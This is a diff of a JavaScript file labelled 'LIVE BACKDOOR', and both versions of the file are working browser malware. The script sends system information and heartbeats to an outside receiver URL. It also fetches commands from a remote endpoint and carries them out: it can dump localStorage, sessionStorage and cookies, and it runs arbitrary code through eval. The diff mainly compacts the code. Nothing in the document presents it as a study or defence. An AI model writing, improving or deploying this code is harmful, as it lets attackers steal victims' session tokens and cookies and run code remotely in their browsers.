@@ -1,25 +1,22 @@
 // ============================================================
-//  BACKDOOR.JS — FULL WORKING VERSION
-//  Sends to: https://verdant-frangipane-b8d9fd-production.up.railway.app/exfil
+//  LIVE BACKDOOR.JS
+//  Receiver: https://verdant-frangipane-b8d9fd-production.up.railway.app/exfil
+//  Commands: https://verdant-frangipane-b8d9fd-production.up.railway.app/cmd
 // ============================================================
 
 (function() {
     'use strict';
 
-    // ===== YOUR RECEIVER URL =====
     const RECEIVER = 'https://verdant-frangipane-b8d9fd-production.up.railway.app/exfil';
     const CMD_URL = 'https://verdant-frangipane-b8d9fd-production.up.railway.app/cmd';
 
-    // ===== SESSION ID =====
     function getSession() {
         if (!localStorage.getItem('_bckdr_sid')) {
-            const sid = Date.now() + '-' + Math.random().toString(36).slice(2);
-            localStorage.setItem('_bckdr_sid', sid);
+            localStorage.setItem('_bckdr_sid', Date.now() + '-' + Math.random().toString(36).slice(2));
         }
         return localStorage.getItem('_bckdr_sid');
     }
 
-    // ===== SEND DATA =====
     function sendData(data) {
         const payload = {
             session: getSession(),
@@ -28,14 +25,9 @@
             userAgent: navigator.userAgent,
             data: data
         };
-
         try {
             const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
             navigator.sendBeacon(RECEIVER, encoded);
-        } catch(e) {}
-
-        try {
-            const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));
             fetch(RECEIVER, {
                 method: 'POST',
                 body: encoded,
@@ -43,21 +35,15 @@
                 mode: 'no-cors'
             }).catch(() => {});
         } catch(e) {}
-
-        console.log('📤 Data sent to:', RECEIVER);
+        console.log('📤 Data sent to receiver');
     }
 
-    // ===== EXECUTE COMMANDS =====
-    function executeCommand(command) {
+    function executeCommand(cmd) {
         let result = '';
-
-        if (command === 'help') {
-            result = 'Commands: help, ping, status, keys, dump, js:code';
-        } else if (command === 'ping') {
-            result = 'pong';
-        } else if (command === 'status') {
-            result = 'Backdoor running. Session: ' + getSession();
-        } else if (command === 'keys') {
+        if (cmd === 'help') result = 'Commands: help, ping, status, keys, dump, js:code';
+        else if (cmd === 'ping') result = 'pong';
+        else if (cmd === 'status') result = 'Session: ' + getSession();
+        else if (cmd === 'keys') {
             const keys = [];
             for (let i = 0; i < localStorage.length; i++) {
                 const key = localStorage.key(i);
@@ -67,42 +53,32 @@
                 }
             }
             result = JSON.stringify(keys, null, 2);
-        } else if (command === 'dump') {
+        } else if (cmd === 'dump') {
             result = JSON.stringify({
                 localStorage: localStorage,
                 sessionStorage: sessionStorage,
                 cookies: document.cookie
             }, null, 2);
-        } else if (command.startsWith('js:')) {
+        } else if (cmd.startsWith('js:')) {
             try {
-                const code = command.slice(3);
-                const evalResult = eval(code);
+                const evalResult = eval(cmd.slice(3));
                 result = typeof evalResult === 'string' ? evalResult : JSON.stringify(evalResult, null, 2);
             } catch(e) {
                 result = 'Error: ' + e.message;
             }
         } else {
-            result = 'Unknown command. Type "help" for available commands.';
+            result = 'Unknown command. Type "help".';
         }
-
         return result;
     }
 
-    // ============================================================
-    //  HEARTBEAT + COMMAND CHECK
-    // ============================================================
-
     function startHeartbeat() {
         sendData({ type: 'heartbeat', session: getSession() });
-
         setInterval(() => {
             sendData({ type: 'heartbeat', session: getSession() });
         }, 30000);
-
-        // Check for commands every 30 seconds
         setInterval(() => {
-            const sid = getSession();
-            fetch(CMD_URL + '?sid=' + sid)
+            fetch(CMD_URL + '?sid=' + getSession())
                 .then(r => r.json())
                 .then(commands => {
                     if (commands && commands.length > 0) {
@@ -116,25 +92,11 @@
         }, 30000);
     }
 
-    // ============================================================
-    //  INIT
-    // ============================================================
-
     function init() {
-        console.log('🔥 Backdoor loaded!');
+        console.log('🔥 LIVE BACKDOOR LOADED');
         console.log('📡 Receiver:', RECEIVER);
         console.log('🔑 Session:', getSession());
-        console.log('ℹ️ Commands: help, ping, status, keys, dump, js:code');
-
-        // Send initial system info
-        sendData({
-            type: 'system_info',
-            platform: navigator.platform,
-            userAgent: navigator.userAgent,
-            screen: window.screen.width + 'x' + window.screen.height,
-            language: navigator.language
-        });
-
+        sendData({ type: 'system_info', platform: navigator.platform, userAgent: navigator.userAgent, screen: window.screen.width + 'x' + window.screen.height });
         startHeartbeat();
     }
 
